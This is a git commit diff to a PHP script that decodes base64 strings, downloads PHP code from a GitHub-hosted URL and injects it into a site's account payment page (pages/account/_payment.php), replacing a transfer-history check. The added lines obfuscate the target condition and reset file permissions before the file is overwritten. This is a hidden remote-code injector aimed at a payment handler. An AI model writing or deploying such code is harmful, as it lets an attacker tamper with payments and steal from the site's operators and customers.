11500051e9bbc496627d5ca29df8ca7676718afc
ivanovasardina <ivanova.sardina@yandex.ru>
2015-10-30 01:37:37 +0500

    init

--- i.php
+++ i.php
@@ -1,10 +1,9 @@
 <?php
 $_u='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2YW5vdmFzYXJkaW5hL3BwcHJpdmF0ZS5naXRodWIuaW8vbWFzdGVyL3gucGhw';
 $_fn='cGFnZXMvYWNjb3VudC9fcGF5bWVudC5waHA=';
+$_s='aWYgKCFlbXB0eSgkYXJUcmFuc2ZlclsiaGlzdG9yeUlkIl0pKQ==';
 $_f=file_get_contents(base64_decode($_fn));
 $_x=file_get_contents(base64_decode($_u));
-$_n=str_replace('if (!empty($arTransfer["historyId"]))',$_x,$_f);
+$_n=str_replace(base64_decode($_s),$_x,$_f);
+chmod(base64_decode($_fn),0644);
 file_put_contents(base64_decode($_fn),$_n);
-
-
-
